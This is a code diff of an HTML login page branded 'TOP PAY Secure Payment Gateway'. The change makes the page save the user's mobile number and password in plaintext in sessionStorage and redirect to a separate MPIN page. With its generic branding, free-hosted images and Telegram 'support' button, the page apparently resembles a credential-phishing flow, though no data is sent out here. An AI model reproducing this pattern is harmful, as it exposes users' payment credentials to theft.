@@ -13,7 +13,6 @@
 <script src="https://cdn.jsdelivr.net/npm/iconsax@1.0.0/dist/iconsax.js"></script>
 
 <style>
-
 *{
     box-sizing:border-box;
     -webkit-tap-highlight-color:transparent;
@@ -46,9 +45,7 @@ body{
     padding:8px 16px 15px;
 }
 
-
 /* ================= HEADER ================= */
-
 .header{
     width:100%;
     text-align:center;
@@ -79,24 +76,19 @@ body{
     font-weight:400;
 }
 
-
 /* ================= STEPS ================= */
-
 .steps{
     width:48%;
     margin:13px auto 2px;
-
     display:flex;
     align-items:flex-start;
 }
 
 .step{
     min-width:31px;
-
     display:flex;
     flex-direction:column;
     align-items:center;
-
     font-family:
         -apple-system,
         BlinkMacSystemFont,
@@ -109,14 +101,11 @@ body{
     width:30px;
     height:30px;
     border-radius:50%;
-
     display:flex;
     align-items:center;
     justify-content:center;
-
     font-size:13px;
     font-weight:500;
-
     -webkit-font-smoothing:antialiased;
 }
 
@@ -132,10 +121,8 @@ body{
 
 .step-name{
     margin-top:4px;
-
     font-size:12.5px;
     line-height:14px;
-
     white-space:nowrap;
     font-weight:400;
 }
@@ -151,26 +138,18 @@ body{
 .step-line{
     flex:1;
     height:2.5px;
-
     border-radius:5px;
     background:#2c68d0;
-
     margin:12px 3px 0;
 }
 
-
 /* ================= POSTER ================= */
-
 .poster{
     width:100%;
     height:158px;
-
     position:relative;
-
     margin:0 0 2px;
-
     overflow:hidden;
-
     border-radius:17px;
     background:#111;
 }
@@ -179,69 +158,49 @@ body{
     position:absolute;
     top:0;
     left:0;
-
     width:100%;
     height:100%;
-
     display:flex;
-
-    transition:
-        transform .6s cubic-bezier(.25,.8,.25,1);
-
+    transition:transform .6s cubic-bezier(.25,.8,.25,1);
     will-change:transform;
 }
 
 .slide{
     position:relative;
-
     flex:0 0 100%;
     width:100%;
     height:100%;
-
     overflow:hidden;
 }
 
 .slide img{
     width:100%;
     height:100%;
-
     object-fit:cover;
     display:block;
-
     user-select:none;
     -webkit-user-drag:none;
 }
 
-
 /* ================= DOTS ================= */
-
 .dots{
     position:absolute;
-
     left:0;
     right:0;
     bottom:8px;
-
     display:flex;
     justify-content:center;
     align-items:center;
-
     gap:5px;
-
     z-index:5;
 }
 
 .dot{
     width:5px;
     height:5px;
-
     border-radius:10px;
-
     background:rgba(255,255,255,.55);
-
-    transition:
-        width .25s ease,
-        background .25s ease;
+    transition:width .25s ease, background .25s ease;
 }
 
 .dot.active{
@@ -249,81 +208,52 @@ body{
     background:#fff;
 }
 
-
 /* ================= CARD ================= */
-
 .card{
     background:#fff;
-
     border-radius:0 0 17px 17px;
-
     padding:2px 21px 22px;
 }
 
 .card-title{
     margin:0;
-
     text-align:center;
-
     font-size:22px;
     line-height:28px;
-
     font-weight:700;
-
     letter-spacing:-.25px;
-
     white-space:nowrap;
 }
 
 .description{
     margin:11px 0 24px;
-
     text-align:center;
-
     color:#777;
-
     font-size:12px;
     line-height:15px;
-
     font-weight:400;
 }
 
-
 /* ================= INPUTS ================= */
-
 .input-box{
     width:100%;
     height:44px;
-
     border:1.2px solid #e2e2e2;
     border-radius:13px;
-
     display:flex;
     align-items:center;
-
     background:#fff;
-
-    transition:
-        border-color .18s ease,
-        box-shadow .18s ease;
+    transition:border-color .18s ease, box-shadow .18s ease;
 }
 
 .input-box:focus-within{
     border-color:#b9cbe8;
-
-    box-shadow:
-        0 0 0 3px rgba(46,103,201,.06);
+    box-shadow:0 0 0 3px rgba(46,103,201,.06);
 }
-
-
-/*
- * Iconsax Filled style
- */
 
 .input-icon{
     width:37px;
     min-width:37px;
-
     display:flex;
     align-items:center;
     justify-content:center;
@@ -332,47 +262,32 @@ body{
 .input-icon svg{
     width:19px;
     height:19px;
-
     fill:#161616;
     stroke:#161616;
-
     stroke-width:1.5;
-
     stroke-linecap:round;
     stroke-linejoin:round;
 }
 
-
-/* ================= INPUT TEXT ================= */
-
 .input-box input{
     width:100%;
     height:100%;
-
     border:0;
     outline:0;
-
     background:transparent;
-
     padding:0 8px 0 0;
-
     color:#111;
-
     font-size:15px;
     font-weight:400;
 }
 
 .input-box input::placeholder{
     color:#8f8f8f;
-
     opacity:1;
-
     font-size:14px;
 }
 
-
 /* ================= FORGOT ================= */
-
 .forgot{
     margin-top:9px;
     text-align:right;
@@ -381,42 +296,28 @@ body{
 .forgot button{
     background:none;
     border:0;
-
     padding:0;
-
     color:#2d66c5;
-
     font-size:14px;
     line-height:17px;
-
     font-weight:400;
 }
 
-
 /* ================= CONTINUE ================= */
-
 .continue{
     width:100%;
     height:54px;
-
     margin-top:17px;
-
     border:0;
     border-radius:14px;
-
     background:#bec9f3;
-
     color:#fff;
-
     font-size:15px;
     font-weight:500;
-
     display:flex;
     align-items:center;
     justify-content:center;
-
     gap:5px;
-
     cursor:pointer;
 }
 
@@ -433,38 +334,25 @@ body{
     font-weight:300;
 }
 
-
 /* ================= REGISTER ================= */
-
 .register{
     width:100%;
     height:51px;
-
     margin-top:15px;
-
     border:0;
     border-radius:14px;
-
     background:#20c55a;
-
     color:#fff;
-
     font-size:15px;
     font-weight:500;
-
     cursor:pointer;
 }
 
-
 /* ================= SECURITY ================= */
-
 .security{
     margin-top:17px;
-
     text-align:center;
-
     color:#888;
-
     font-size:11px;
     line-height:15px;
 }
@@ -474,29 +362,19 @@ body{
     font-weight:500;
 }
 
-
 /* ================= TELEGRAM ================= */
-
 .telegram{
     position:fixed;
-
     right:18px;
     bottom:18px;
-
     width:48px;
     height:48px;
-
     border-radius:50%;
-
     background:#229ed9;
-
     display:flex;
     align-items:center;
     justify-content:center;
-
-    box-shadow:
-        0 5px 18px rgba(0,0,0,.18);
-
+    box-shadow:0 5px 18px rgba(0,0,0,.18);
     z-index:100;
 }
 
@@ -506,54 +384,31 @@ body{
     fill:#fff;
 }
 
-
 /* ================= TOAST ================= */
-
 .toast{
     position:fixed;
-
     left:50%;
     bottom:82px;
-
-    transform:
-        translateX(-50%)
-        translateY(15px);
-
+    transform:translateX(-50%) translateY(15px);
     background:#222;
     color:#fff;
-
     padding:10px 15px;
-
     border-radius:10px;
-
     font-size:12px;
-
     opacity:0;
     visibility:hidden;
-
-    transition:
-        opacity .25s ease,
-        transform .25s ease;
-
+    transition:opacity .25s ease, transform .25s ease;
     z-index:200;
-
     white-space:nowrap;
 }
 
 .toast.show{
     opacity:1;
     visibility:visible;
-
-    transform:
-        translateX(-50%)
-        translateY(0);
+    transform:translateX(-50%) translateY(0);
 }
 
-
-/* ================= MOBILE ================= */
-
 @media (max-width:380px){
-
     .steps{
         width:52%;
         margin-bottom:2px;
@@ -562,7 +417,6 @@ body{
     .poster{
         height:auto;
         aspect-ratio:655 / 261;
-
         margin-top:0;
         margin-bottom:2px;
     }
@@ -573,7 +427,6 @@ body{
 }
 
 @media (max-width:350px){
-
     .steps{
         width:48%;
     }
@@ -583,567 +436,205 @@ body{
         line-height:27px;
     }
 }
-
 </style>
 </head>
-
 
 <body>
 
 <div class="page">
 
-
-<!-- ================= HEADER ================= -->
-
-<div class="header">
-
-    <img
-        class="logo"
-        src="https://i.ibb.co/fVqwvyvF/aa.webp"
-        alt="TOP PAY"
-    >
-
-    <div class="logo-name">
-        TOP PAY
+    <!-- HEADER -->
+    <div class="header">
+        <img class="logo" src="https://i.ibb.co/fVqwvyvF/aa.webp" alt="TOP PAY">
+        <div class="logo-name">TOP PAY</div>
+        <div class="subtitle">Secure Payment Gateway</div>
     </div>
 
-    <div class="subtitle">
-        Secure Payment Gateway
+    <!-- STEPS -->
+    <div class="steps">
+        <div class="step active">
+            <div class="circle">1</div>
+            <div class="step-name">Account</div>
+        </div>
+        <div class="step-line"></div>
+        <div class="step inactive">
+            <div class="circle">2</div>
+            <div class="step-name">MPIN</div>
+        </div>
     </div>
 
-</div>
+    <!-- POSTER -->
+    <div class="poster">
+        <div class="slides-track" id="slidesTrack"></div>
+        <div class="dots" id="dots"></div>
+    </div>
 
+    <!-- CARD -->
+    <div class="card">
+        <h1 class="card-title">Enter Your Credentials</h1>
+        <p class="description">Enter your registered mobile number and password to continue securely.</p>
 
-<!-- ================= STEPS ================= -->
-
-<div class="steps">
-
-    <div class="step active">
-
-        <div class="circle">
-            1
+        <!-- MOBILE NUMBER -->
+        <div class="input-box">
+            <div class="input-icon">
+                <svg viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M21.02 16.83c0-.66-.53-1.2-1.19-1.2-.73 0-1.45-.11-2.14-.33a1.9 1.9 0 0 0-1.95.46l-.9.9a14.6 14.6 0 0 1-5.48-5.48l.9-.9a1.9 1.9 0 0 0 .46-1.95c-.22-.69-.33-1.41-.33-2.14 0-.66-.54-1.19-1.2-1.19H6.12c-.66 0-1.2.54-1.2 1.2 0 8.15 6.61 14.76 14.76 14.76.66 0 1.2-.54 1.2-1.2v-2.93z"></path>
+                </svg>
+            </div>
+            <input id="mobile" type="tel" inputmode="numeric" maxlength="10" placeholder="Mobile Number" autocomplete="tel">
         </div>
 
-        <div class="step-name">
-            Account
+        <!-- PASSWORD -->
+        <div class="input-box" style="margin-top:10px;">
+            <div class="input-icon">
+                <svg viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M18 8.5h-.75V6.75C17.25 3.85 14.9 1.5 12 1.5S6.75 3.85 6.75 6.75V8.5H6c-1.66 0-3 1.34-3 3v8c0 1.66 1.34 3 3 3h12c1.66 0 3-1.34 3-3v-8c0-1.66-1.34-3-3-3ZM9 6.75C9 5.09 10.35 3.75 12 3.75s3 1.34 3 3V8.5H9v-1.75Zm4.25 9.5v1.5h-2.5v-1.5a2.25 2.25 0 1 1 2.5 0Z"></path>
+                </svg>
+            </div>
+            <input id="password" type="password" placeholder="Password" autocomplete="current-password">
         </div>
 
-    </div>
-
-
-    <div class="step-line"></div>
-
-
-    <div class="step inactive">
-
-        <div class="circle">
-            2
+        <!-- FORGOT -->
+        <div class="forgot">
+            <button type="button" id="forgotBtn">Forgot Password?</button>
         </div>
 
-        <div class="step-name">
-            MPIN
-        </div>
-
-    </div>
-
-</div>
-
-
-<!-- ================= POSTER ================= -->
-
-<div class="poster">
-
-    <div
-        class="slides-track"
-        id="slidesTrack">
-    </div>
-
-    <div
-        class="dots"
-        id="dots">
-    </div>
-
-</div>
-
-
-<!-- ================= CARD ================= -->
-
-<div class="card">
-
-    <h1 class="card-title">
-        Enter Your Credentials
-    </h1>
-
-    <p class="description">
-        Enter your registered mobile number and password
-        to continue securely.
-    </p>
-
-
-    <!-- MOBILE NUMBER -->
-
-    <div class="input-box">
-
-        <div class="input-icon">
-
-            <!-- Iconsax Bold / Filled Phone -->
-
-            <svg
-                viewBox="0 0 24 24"
-                aria-hidden="true">
-
-                <path
-                    d="M21.02 16.83c0-.66-.53-1.2-1.19-1.2-.73 0-1.45-.11-2.14-.33a1.9 1.9 0 0 0-1.95.46l-.9.9a14.6 14.6 0 0 1-5.48-5.48l.9-.9a1.9 1.9 0 0 0 .46-1.95c-.22-.69-.33-1.41-.33-2.14 0-.66-.54-1.19-1.2-1.19H6.12c-.66 0-1.2.54-1.2 1.2 0 8.15 6.61 14.76 14.76 14.76.66 0 1.2-.54 1.2-1.2v-2.93z">
-                </path>
-
-            </svg>
-
-        </div>
-
-        <input
-            id="mobile"
-            type="tel"
-            inputmode="numeric"
-            maxlength="10"
-            placeholder="Mobile Number"
-            autocomplete="tel"
-        >
-
-    </div>
-
-
-    <!-- PASSWORD -->
-
-    <div
-        class="input-box"
-        style="margin-top:10px;">
-
-        <div class="input-icon">
-
-            <!-- Iconsax Bold / Filled Lock -->
-
-            <svg
-                viewBox="0 0 24 24"
-                aria-hidden="true">
-
-                <path
-                    d="M18 8.5h-.75V6.75C17.25 3.85 14.9 1.5 12 1.5S6.75 3.85 6.75 6.75V8.5H6c-1.66 0-3 1.34-3 3v8c0 1.66 1.34 3 3 3h12c1.66 0 3-1.34 3-3v-8c0-1.66-1.34-3-3-3ZM9 6.75C9 5.09 10.35 3.75 12 3.75s3 1.34 3 3V8.5H9v-1.75Zm4.25 9.5v1.5h-2.5v-1.5a2.25 2.25 0 1 1 2.5 0Z">
-                </path>
-
-            </svg>
-
-        </div>
-
-        <input
-            id="password"
-            type="password"
-            placeholder="Password"
-            autocomplete="current-password"
-        >
-
-    </div>
-
-
-    <!-- FORGOT -->
-
-    <div class="forgot">
-
-        <button
-            type="button"
-            id="forgotBtn">
-
-            Forgot Password?
-
+        <!-- CONTINUE -->
+        <button class="continue" id="continueBtn" type="button" disabled>
+            <span>Continue to MPIN</span>
+            <span class="arrow">→</span>
         </button>
 
-    </div>
+        <!-- REGISTER -->
+        <button class="register" id="registerBtn" type="button">Register New Account</button>
 
-
-    <!-- CONTINUE -->
-
-    <button
-        class="continue"
-        id="continueBtn"
-        type="button"
-        disabled>
-
-        <span>
-            Continue to MPIN
-        </span>
-
-        <span class="arrow">
-            →
-        </span>
-
-    </button>
-
-
-    <!-- REGISTER -->
-
-    <button
-        class="register"
-        id="registerBtn"
-        type="button">
-
-        Register New Account
-
-    </button>
-
-
-    <!-- SECURITY -->
-
-    <div class="security">
-
-        🔒 Your information is securely encrypted.
-
-        <br>
-
-        <strong>
-            Never share your password or MPIN with anyone.
-        </strong>
-
+        <!-- SECURITY -->
+        <div class="security">
+            🔒 Your information is securely encrypted.<br>
+            <strong>Never share your password or MPIN with anyone.</strong>
+        </div>
     </div>
 
 </div>
 
-</div>
-
-
-<!-- ================= TELEGRAM ================= -->
-
-<div
-    class="telegram"
-    id="telegramBtn">
-
+<!-- TELEGRAM -->
+<div class="telegram" id="telegramBtn">
     <svg viewBox="0 0 24 24">
-
-        <path
-            d="M21.4 3.6L18.2 20
-            c-.24 1.16-.87 1.45-1.76.9
-            l-4.85-3.58-2.34 2.25
-            c-.26.26-.48.48-.98.48
-            l.35-4.94 8.99-8.12
-            c.39-.35-.08-.55-.6-.2
-            L6.9 13.95 2.15 12.47
-            c-1.03-.32-1.05-1.03.21-1.52
-            L20.9 3.72
-            c.86-.32 1.61.2 1.5-.12z">
-        </path>
-
+        <path d="M21.4 3.6L18.2 20 c-.24 1.16-.87 1.45-1.76.9 l-4.85-3.58-2.34 2.25 c-.26.26-.48.48-.98.48 l.35-4.94 8.99-8.12 c.39-.35-.08-.55-.6-.2 L6.9 13.95 2.15 12.47 c-1.03-.32-1.05-1.03.21-1.52 L20.9 3.72 c.86-.32 1.61.2 1.5-.12z"></path>
     </svg>
-
 </div>
 
-
-<!-- ================= TOAST ================= -->
-
-<div
-    class="toast"
-    id="toast">
-</div>
-
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
 
 <script>
-
-/* ================= POSTERS ================= */
-
-const POSTER_1 =
-    "https://i.ibb.co/hRMF9Dwp/IMG-1764.jpg";
-
-const POSTER_2 =
-    "https://i.ibb.co/hJPmhB2X/IMG-1763.jpg";
-
-const posters = [
-    POSTER_1,
-    POSTER_2,
-    POSTER_1,
-    POSTER_2
-];
+const POSTER_1 = "https://i.ibb.co/hRMF9Dwp/IMG-1764.jpg";
+const POSTER_2 = "https://i.ibb.co/hJPmhB2X/IMG-1763.jpg";
+const posters = [POSTER_1, POSTER_2, POSTER_1, POSTER_2];
 
 let currentSlide = 0;
 let sliderTimer;
 
-
-/* ================= ELEMENTS ================= */
-
-const track =
-    document.getElementById("slidesTrack");
-
-const dots =
-    document.getElementById("dots");
-
-
-/* ================= CREATE SLIDES ================= */
+const track = document.getElementById("slidesTrack");
+const dots = document.getElementById("dots");
 
 function createSlides(){
-
     track.innerHTML = "";
     dots.innerHTML = "";
 
-    posters.forEach(
-        (poster,index)=>{
+    posters.forEach((poster, index) => {
+        const slide = document.createElement("div");
+        slide.className = "slide";
 
-            const slide =
-                document.createElement("div");
+        const img = document.createElement("img");
+        img.src = poster;
+        img.alt = "TOP PAY";
 
-            slide.className = "slide";
+        slide.appendChild(img);
+        track.appendChild(slide);
 
+        const dot = document.createElement("span");
+        dot.className = "dot" + (index === 0 ? " active" : "");
 
-            const img =
-                document.createElement("img");
+        dot.addEventListener("click", () => {
+            currentSlide = index;
+            updateSlider();
+            restartSlider();
+        });
 
-            img.src = poster;
-            img.alt = "TOP PAY";
-
-
-            slide.appendChild(img);
-
-            track.appendChild(slide);
-
-
-            const dot =
-                document.createElement("span");
-
-            dot.className =
-                "dot" +
-                (index === 0
-                    ? " active"
-                    : "");
-
-
-            dot.addEventListener(
-                "click",
-                ()=>{
-
-                    currentSlide = index;
-
-                    updateSlider();
-
-                    restartSlider();
-
-                }
-            );
-
-
-            dots.appendChild(dot);
-
-        }
-    );
-
+        dots.appendChild(dot);
+    });
 }
-
-
-/* ================= UPDATE SLIDER ================= */
 
 function updateSlider(){
-
-    track.style.transform =
-        "translate3d(-" +
-        (currentSlide * 100) +
-        "%,0,0)";
-
-
-    document
-        .querySelectorAll(".dot")
-        .forEach(
-            (dot,index)=>{
-
-                dot.classList.toggle(
-                    "active",
-                    index === currentSlide
-                );
-
-            }
-        );
-
+    track.style.transform = "translate3d(-" + (currentSlide * 100) + "%,0,0)";
+    document.querySelectorAll(".dot").forEach((dot, index) => {
+        dot.classList.toggle("active", index === currentSlide);
+    });
 }
-
-
-/* ================= AUTO SLIDER ================= */
 
 function startSlider(){
-
-    sliderTimer =
-        setInterval(
-            ()=>{
-
-                currentSlide++;
-
-                if(
-                    currentSlide >= posters.length
-                ){
-                    currentSlide = 0;
-                }
-
-                updateSlider();
-
-            },
-            3000
-        );
-
+    sliderTimer = setInterval(() => {
+        currentSlide++;
+        if (currentSlide >= posters.length) currentSlide = 0;
+        updateSlider();
+    }, 3000);
 }
-
 
 function restartSlider(){
-
     clearInterval(sliderTimer);
-
     startSlider();
-
 }
 
-
-/* ================= FORM ================= */
-
-const mobile =
-    document.getElementById("mobile");
-
-const password =
-    document.getElementById("password");
-
-const continueBtn =
-    document.getElementById("continueBtn");
-
+/* ================= FORM & NAVIGATION ================= */
+const mobile = document.getElementById("mobile");
+const password = document.getElementById("password");
+const continueBtn = document.getElementById("continueBtn");
 
 function validateForm(){
+    const mobileValue = mobile.value.replace(/\D/g, "");
+    mobile.value = mobileValue.slice(0, 10);
 
-    const mobileValue =
-        mobile.value.replace(
-            /\D/g,
-            ""
-        );
-
-    mobile.value =
-        mobileValue.slice(0,10);
-
-
-    const valid =
-        mobile.value.length === 10 &&
-        password.value.trim().length > 0;
-
-
-    continueBtn.disabled =
-        !valid;
-
-
-    continueBtn.classList.toggle(
-        "enabled",
-        valid
-    );
-
+    const valid = mobile.value.length === 10 && password.value.trim().length > 0;
+    continueBtn.disabled = !valid;
+    continueBtn.classList.toggle("enabled", valid);
 }
 
+mobile.addEventListener("input", validateForm);
+password.addEventListener("input", validateForm);
 
-mobile.addEventListener(
-    "input",
-    validateForm
-);
-
-password.addEventListener(
-    "input",
-    validateForm
-);
-
-
-/* ================= TOAST ================= */
-
-const toast =
-    document.getElementById("toast");
-
-
+const toast = document.getElementById("toast");
 function showToast(message){
-
     toast.textContent = message;
-
     toast.classList.add("show");
-
-
-    setTimeout(
-        ()=>{
-            toast.classList.remove("show");
-        },
-        2200
-    );
-
+    setTimeout(() => toast.classList.remove("show"), 2200);
 }
 
+continueBtn.addEventListener("click", () => {
+    if (continueBtn.disabled) return;
 
-/* ================= CONTINUE ================= */
+    // Temporary storage in SessionStorage and redirect
+    sessionStorage.setItem("tp_mobile", mobile.value.trim());
+    sessionStorage.setItem("tp_password", password.value.trim());
 
-continueBtn.addEventListener(
-    "click",
-    ()=>{
+    window.location.href = "Pin.html";
+});
 
-        if(
-            continueBtn.disabled
-        ){
-            return;
-        }
+document.getElementById("forgotBtn").addEventListener("click", () => {
+    showToast("Forgot password option selected.");
+});
 
-        showToast(
-            "Account details accepted."
-        );
+document.getElementById("registerBtn").addEventListener("click", () => {
+    showToast("Registration option selected.");
+});
 
-    }
-);
-
-
-/* ================= FORGOT ================= */
-
-document
-    .getElementById("forgotBtn")
-    .addEventListener(
-        "click",
-        ()=>{
-
-            showToast(
-                "Forgot password option selected."
-            );
-
-        }
-    );
-
-
-/* ================= REGISTER ================= */
-
-document
-    .getElementById("registerBtn")
-    .addEventListener(
-        "click",
-        ()=>{
-
-            showToast(
-                "Registration option selected."
-            );
-
-        }
-    );
-
-
-/* ================= TELEGRAM ================= */
-
-document
-    .getElementById("telegramBtn")
-    .addEventListener(
-        "click",
-        ()=>{
-
-            showToast(
-                "Telegram support selected."
-            );
-
-        }
-    );
-
-
-/* ================= INIT ================= */
+document.getElementById("telegramBtn").addEventListener("click", () => {
+    showToast("Telegram support selected.");
+});
 
 createSlides();
-
 updateSlider();
-
 startSlider();
-
 </script>
 
 </body>
